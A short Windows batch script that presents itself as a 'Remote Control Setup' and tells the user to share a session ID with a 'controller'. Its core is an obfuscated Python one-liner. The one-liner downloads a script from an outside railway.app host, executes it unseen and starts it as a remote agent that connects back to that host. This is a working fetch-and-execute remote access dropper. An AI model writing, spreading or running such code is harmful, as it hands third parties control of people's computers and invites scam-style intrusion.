@echo off
echo 🖥️ Remote Control Setup
echo.
echo 📋 Instructions:
echo   1. Make sure Python is installed
echo   2. This will connect to: https://web-production-463b89.up.railway.app
echo   3. Copy the Session ID when it appears
echo   4. Share the Session ID with your controller
echo.
pause

python -c "exec(__import__('urllib.request').urlopen('https://web-production-463b89.up.railway.app/remote_control.py').read().decode().split('if __name__')[0]); __import__('subprocess').run([__import__('sys').executable, '-c', 'exec(__import__(\"urllib.request\").urlopen(\"https://web-production-463b89.up.railway.app/remote_control.py\").read().decode())', 'agent', 'https://web-production-463b89.up.railway.app'])"

pause
